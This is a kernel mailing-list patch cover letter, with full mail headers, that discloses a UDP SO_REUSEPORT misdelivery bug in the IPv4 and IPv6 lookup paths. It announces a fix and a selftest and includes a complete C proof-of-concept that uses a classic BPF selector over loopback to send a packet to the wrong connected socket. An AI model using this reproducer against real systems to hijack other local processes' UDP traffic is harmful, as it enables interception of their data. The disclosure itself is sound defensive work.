Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.210.175
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794801342;
	b=BDOJGddOgcRVMbNnqV4JFH89inYk1y+FS4KFOen5c6jZRKAuPFtHgXRaMuhqegcAyT1m
	 27tkERrsIOO67gEA7rZZ9+TWxENu7OVCGdhpStcjVpkGjZLxNyCVAxej7x0OW5HMKRkIm
	 A25MO4K7IAiP9cy+72VBJEhIE8dxYhrUCUrqIlLaF9JQU4ZD9aEvXRw10Rx6XybjebzYM
	 WCp7MUVDG5Hwn/GhDk3h+HGSKCJeSDr/5xqJiOAaoeE281r+WVrLbgn0iyvY3vSDtWqey
	 /eDFEqV8bdEWn3EulVdPJS6+u5HhgcqZCRCBUgV0Cqri8VnRVWbH/JQVtf9aNes4Z0A==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794801342;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
	b=DA2ApF2Ay+HkClAiuL3anHQYb7BukjmG3E8q+1A5+EmLSi1GTcnphNLU/ws9igdZjTxh
	 IGp5kPZZOQ78/FY/kuxNa5ImgNejDfrZvOS65IFDkBDkavxw0ClykEbxSqc6OSXndXTW3
	 hhh0EjtNrJ9M+BH7QURIg4NOiRROAgDq5DWXAI01rtXFa0OpU1u7oIkGfGoamMexALf3H
	 JU1lfQjEBrZ1griy9KniNaeIXQwb5SDsrXjVfabs89qHkKIOYKXmgXbjf/TdO0t3Uj+4f
	 IMFotNFNb24nD/PixR5SoUEIwGiAm1hVdjGqGWGmKH+PYuujtJaFKt07ctRO/18P4Ng==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ie0kkSue;
	arc=none smtp.remote-ip=209.85.210.175
Received: from mail-pf1-f175.google.com (mail-pf1-f175.google.com [209.85.210.175])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E48EC606A31C
	for <linux-kselftest@vger.kernel.org>; Mon, 16 Nov 2026 03:55:41 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E48EC606A31C
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ie0kkSue
Received: by mail-pf1-f175.google.com with SMTP id d2e1a72fcca58-8a594d313a3so2296629b3a.1
        for <linux-kselftest@vger.kernel.org>; Sun, 15 Nov 2026 19:55:41 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1794801341; x=1795406141; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
        b=ie0kkSue83AikMvDY7FSOEkyoNdRRGGwBG+QWGB+rRbeTjWObsWCFG3ucfE/SLjHSF
         OzrMS3wqi1jCKXDvcxSqvGQyF96Hyj1N26O9DDdPagsS0rwBFT7EhSBEyCQbuFCoUUe5
         /K9z7UuUVShQiEBeA1FYNgBAIQdbc3YvOljcw7TS/MGT+WB4agus1VT7QEkEF2mvjAR4
         py9vLpgyJIA6lxUh1Z4BDr0Y0GLQ8jPBv+h4Gce6y8shRA516pPF6Mxx6yGs26Ud79/o
         30Kd2A/UPhFkd+bThOgDO0tvQvVpPaGzpq6msx95fko6SBvm+m9Zl4TAhz69IKdZMmwP
         DvmQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794801341; x=1795406141;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
        b=VwS7qyQ+tL3nKbrN76pu9CnZ/IO56E56uaFSE5OHoHMNielKcdyyb52D9VL14XLm0K
         uM1kPOwhVa3DwAZofGAocD+tne0DRgBeeo1ULty5eoU9AQcGkIt5XIXRCIgQ4X30I7Sz
         Qx5dg8kgEZ7UbO14UUMNo7g4smKhLDLG6RkipqO9zVnjxXvwFG2JASVdP373W/NU/5zf
         C+d+XplMlYxK/ZI9N4duSolj3CF7Pj2tXg7kc3JZQ+5XcaqwlzoJ4XwP7X3WuIo7sRE0
         CMyIh2Dbb+0pcNgdSfOjWAfdzPkAZva0ZrsTqKa4Em9e1dkcou9NA0tAfsrj8Ql5pmZV
         QQqg==
X-Forwarded-Encrypted: i=1; AL+hErFUjku35l1zsPqgis7/2UNp90TH7cvwMPvyeNwd2AEZj/QPp5BvlbO8iH/Bw2PHn71emyn1BlfzGCfSfs+abwA=@vger.kernel.org
X-Gm-Message-State: APuU4Z/xWbfoxO170FC50K3TYNJtBWuzkZYUddzWiE1n22fasPRCwLfM
	clHu3r0UqA+KUPLzpvSAmce+mpYvsgzRcINHW6E7QYlsemVnK0zVaUVYrYvy7+mSxWfX
X-Gm-Gg: AYBFou1WeQ+h39B5vwpW+D747u6PvR6BNLmb2RB4i5LlWgaxAAWbBO/JZXEszUSQujc
	6f8fT6fe3MR8q6VmfkrifAq9BiSXLoZ2Nn83UUUfiCDeFNGiPtpW+db1wU/i7XxbME31WswL5d6
	fmW/mlPtHQGdfIsRXCfINMqbuDop7jjvITi/R+y3M1lLs9+d3Ro5fCoxZR9zJ9WaW0VJ/KWm0cv
	EtgWu38UHEOA0eXIeeag6Ct+MljBFTiYNY+ZsGRnJE/5DQw1f1ipsUiin45s4KCNW2GJb4AL3Gc
	a3dRGuv8J5ObvNs1rbuUqq6pCiukTSRRAKfsnEQlgZ7Egr4k3843b7B+rRY0paQ68TWayNp22SS
	ykm/W+RlCGzC38lnasaT4wB5I7pHZGjlhdClJPlsTHTTcRwfKQ94wu/54WZV/NuvohfmBK4rR94
	89MnCh06m7wyPzQGFuWE86uPDjWZPIhFOqaR9/pH0PWOpH7QeqhCBC6fCOkappxWOh57sxk4Hzn
	PMZys7mwdqqCGfVUQ0TvLYWj9ZARr9aLfug8BmAJ8wodBickp6o7hrc+4HY8ddHkK3C7FDGGdXi
	PVJkLg4nJLGndZFaaMClddxNaH7SHrNpnLuB5kuySVWYM0r0FFi//fVa4ijnAH4NV+BDGMyvsE7
	icmLIitLEY/staqs1i+yf
X-Received: by 2002:a05:6a21:4506:b0:3de:463c:7fce with SMTP id adf61e73a8af0-3f7a68a51bemr8923750637.12.1794801341039;
        Sun, 15 Nov 2026 19:55:41 -0800 (PST)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cddc1886b12sm3463176a12.11.2026.11.15.19.55.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 15 Nov 2026 19:55:39 -0800 (PST)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	linux-kselftest@vger.kernel.org,
	bpf@vger.kernel.org
Cc: willemdebruijn.kernel@gmail.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	benh@amazon.com,
	kuniyu@google.com,
	shuah@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/2] udp: fix connected reuseport rescore fallback
Date: Mon, 16 Nov 2026 03:55:31 +0000
Message-ID: <cover.1794759652.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: linux-kselftest@vger.kernel.org
List-Id: <linux-kselftest.vger.kernel.org>
List-Post: <mailto:linux-kselftest@vger.kernel.org>
List-Help: <mailto:linux-kselftest+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kselftest+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kselftest+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kselftest+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found a UDP socket misdelivery issue in the IPv4 and IPv6 reuseport
lookup paths, in net/ipv4/udp.c and net/ipv6/udp.c. The issue affects
local users able to create SO_REUSEPORT sockets and attach a classic
reuseport BPF selector; no capability or namespace setup is required by
the trigger itself.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/net/ipv6/udp.c||udp6_lib_lookup2||socket-hijack||m7q
(net/ipv6/udp.c||udp6_lib_lookup2||socket-hijack||m7q)

Bug details:

When a SO_REUSEPORT group contains connected sockets, udp*_lib_lookup2()
rescored the socket selected by the reuseport program. If the selected
socket did not match the packet, the failed score was ignored and the
stale socket remained as the lookup result. The packet could then be
delivered to a socket connected to a different peer.

The fix retains the BPF-selected socket only when its rescore is better
than the current candidate; otherwise it restores the candidate that
established the current score. The same correction is applied to IPv4
and IPv6. The unconnected/no-connected-group fast path is unchanged, and
a selected connected socket that matches the packet still wins.

Reproducer:

Save the PoC below as `poc.c`, then build and run it on a pre-fix kernel:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc

The reproducer uses loopback UDP sockets, a connected SO_REUSEPORT member,
and a classic BPF selector fixed to socket index 1. Packetdrill is not a
suitable harness for this case because the trigger depends on creating and
connecting sockets and installing a `SO_ATTACH_REUSEPORT_CBPF` program;
it does not depend on a special wire-level packet sequence. The source is
included below.

The same mismatch and positive-match cases are covered by the new
`test_connected_reuseport_rescore()` selftest in patch 2. The selftest
harness creates a network namespace, so run it as root:

    make -C tools/testing/selftests/net
    tools/testing/selftests/net/reuseport_bpf

The selftest ran in a 2 vCPU, 2 GB x86-64 QEMU guest. Its test harness
creates a network namespace and was run as root there; the standalone
trigger itself was also exercised as an unprivileged user. On the pre-fix
kernel, the IPv4 and IPv6 mismatch probes both failed at the unexpected
socket assertion. On the fixed kernel, the full selftest exited 0 and
printed SUCCESS; the standalone PoC did not reproduce misdelivery in four
unprivileged guest runs.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SO_ATTACH_REUSEPORT_CBPF
#define SO_ATTACH_REUSEPORT_CBPF 51
#endif

#define PAYLOAD "udp6-lib-lookup2-stale-result"
#define CONNECTED_PEER_PORT 40000
#define TEST_SPORT 12345

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static void set_reuseport(int fd)
{
	int one = 1;

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0)
		die("setsockopt(SO_REUSEPORT)");
}

static int make_udp6_socket(void)
{
	int fd = socket(AF_INET6, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET6)");
	return fd;
}

static void bind_udp6(int fd, const struct in6_addr *addr, uint16_t port)
{
	struct sockaddr_in6 sa = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(port),
		.sin6_addr = *addr,
	};

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(AF_INET6)");
}

static uint16_t get_bound_port(int fd)
{
	struct sockaddr_in6 sa;
	socklen_t salen = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	if (getsockname(fd, (struct sockaddr *)&sa, &salen) < 0)
		die("getsockname");
	return ntohs(sa.sin6_port);
}

static void connect_udp6(int fd, const struct in6_addr *addr, uint16_t port)
{
	struct sockaddr_in6 sa = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(port),
		.sin6_addr = *addr,
	};

	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("connect(AF_INET6)");
}

static void attach_constant_reuseport_cbpf(int fd, unsigned int index)
{
	struct sock_filter filter[] = {
		BPF_STMT(BPF_RET | BPF_K, index),
	};
	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
		.filter = filter,
	};

	if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_REUSEPORT_CBPF,
		       &prog, sizeof(prog)) < 0)
		die("setsockopt(SO_ATTACH_REUSEPORT_CBPF)");
}

static void pin_cpu0(void)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0)
		die("sched_setaffinity");
}

static bool recv_one(int fd, const char *name, uint16_t *sport_out)
{
	char buf[256];
	struct sockaddr_in6 peer;
	struct msghdr msg;
	struct iovec iov;
	ssize_t n;
	socklen_t salen = sizeof(peer);

	memset(&peer, 0, sizeof(peer));
	memset(&msg, 0, sizeof(msg));
	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	msg.msg_name = &peer;
	msg.msg_namelen = salen;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	n = recvmsg(fd, &msg, MSG_DONTWAIT);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK)
			return false;
		die("recvmsg");
	}

	*sport_out = ntohs(peer.sin6_port);
	printf("%s received %zd bytes from sport=%u\n", name, n, *sport_out);
	return true;
}

int main(void)
{
	const struct in6_addr loop = IN6ADDR_LOOPBACK_INIT;
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = 0,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
	};
	const char payload[] = PAYLOAD;
	struct pollfd pfds[2];
	uint16_t dport;
	uint16_t bad_sport = 0;
	uint16_t good_sport = 0;
	ssize_t n;
	int good_fd;
	int bad_fd;
	int send_fd;

	pin_cpu0();

	good_fd = make_udp6_socket();
	set_reuseport(good_fd);
	bind_udp6(good_fd, &loop, 0);
	dport = get_bound_port(good_fd);

	bad_fd = make_udp6_socket();
	set_reuseport(bad_fd);
	bind_udp6(bad_fd, &loop, dport);
	connect_udp6(bad_fd, &loop, CONNECTED_PEER_PORT);

	attach_constant_reuseport_cbpf(good_fd, 1);

	send_fd = make_udp6_socket();
	bind_udp6(send_fd, &loop, TEST_SPORT);
	dst.sin6_port = htons(dport);

	printf("group port=%u, connected peer port=%u, sender sport=%u\n",
	       dport, CONNECTED_PEER_PORT, TEST_SPORT);

	n = sendto(send_fd, payload, sizeof(payload), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	if (n < 0)
		die("sendto");

	pfds[0].fd = good_fd;
	pfds[0].events = POLLIN;
	pfds[1].fd = bad_fd;
	pfds[1].events = POLLIN;

	if (poll(pfds, 2, 1000) < 0)
		die("poll");

	(void)recv_one(good_fd, "good", &good_sport);
	(void)recv_one(bad_fd, "bad-connected", &bad_sport);

	if (bad_sport == TEST_SPORT && good_sport == 0) {
		printf("BUG: packet from sport=%u was delivered to the socket connected to %u\n",
		       bad_sport, CONNECTED_PEER_PORT);
		return 0;
	}

	fprintf(stderr, "PoC did not observe the stale-result misdelivery\n");
	return 2;
}

------END PoC--------

This is a logic issue and does not crash the kernel; no crash log is
available.

Best regards,
Zihan Xi

Zihan Xi (2):
  udp: fix reuseport rescore fallback
  selftests: net: cover connected UDP reuseport rescore

 net/ipv4/udp.c                              |  11 +-
 net/ipv6/udp.c                              |  11 +-
 tools/testing/selftests/net/reuseport_bpf.c | 150 ++++++++++++++++++++
 3 files changed, 166 insertions(+), 6 deletions(-)

-- 
2.43.0

